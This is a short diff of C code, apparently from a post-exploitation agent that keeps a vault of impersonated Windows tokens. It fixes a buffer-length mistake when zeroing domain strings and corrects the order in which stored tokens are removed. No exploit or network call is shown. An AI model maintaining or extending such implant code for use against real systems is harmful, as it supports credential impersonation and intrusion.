@@ -514,7 +514,7 @@ BOOL TokenRemove( DWORD TokenID )
 
         if ( Instance->Tokens.Vault->lpDomain )
         {
-            MemSet( Instance->Tokens.Vault->lpDomain, 0, StringLengthW( Instance->Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
+            MemSet( Instance->Tokens.Vault->lpDomain, 0, StringLengthW( Instance->Tokens.Vault->lpDomain ) * sizeof( WCHAR ) );
             Instance->Win32.LocalFree( Instance->Tokens.Vault->lpDomain );
             Instance->Tokens.Vault->lpDomain = NULL;
         }
@@ -569,7 +569,7 @@ BOOL TokenRemove( DWORD TokenID )
 
                 if ( TokenItem->lpDomain )
                 {
-                    MemSet( TokenItem->lpDomain, 0, StringLengthW( TokenItem->lpUser ) * sizeof( WCHAR ) );
+                    MemSet( TokenItem->lpDomain, 0, StringLengthW( TokenItem->lpDomain ) * sizeof( WCHAR ) );
                     Instance->Win32.LocalFree( TokenItem->lpDomain );
                     TokenItem->lpDomain = NULL;
                 }
@@ -695,8 +695,8 @@ VOID TokenClear(
         TokenIndex++;
     } while ( TRUE );
 
-    for ( int i = 0; i < TokenIndex; i++ ) {
-        TokenRemove( 0 );
+    for ( int i = TokenIndex - 1; i >= 0; i-- ) {
+        TokenRemove( i );
     }
 
     Instance->Tokens.Impersonate = FALSE;
